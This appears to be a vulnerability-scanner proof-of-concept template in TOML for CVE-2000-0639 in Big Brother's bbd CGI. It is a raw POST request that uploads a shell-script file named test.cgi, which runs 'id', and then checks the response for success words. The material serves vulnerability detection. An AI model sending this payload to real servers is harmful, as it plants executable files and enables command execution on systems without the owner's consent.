[info]
author = "ave"
description = "通过向 Big Brother bbd CGI 接口发送特制请求，上传具有 .cgi 扩展名的文件到 Web 服务器可执行目录，导致任意命令执行。验证方式：发送包含恶意文件名的上传请求，检查响应中是否包含成功标识。"
id = "POC-AVE-2000-0491"
name = "Big Brother bbd CGI File Creation PoC"
severity = "high"
tags = ["ave-2000-0491"]
vuln_id = [
    "CVE-2000-0639",
    "AVE-2000-0491",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/bbd"
protocol = "http"

[poc.requests.body]
content = "cmd=upload&filename=test.cgi&data=%23!/bin/sh%0Aecho+Content-Type:+text/plain%0Aecho+%0Aid"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uploaded",
    "success",
    "OK",
]
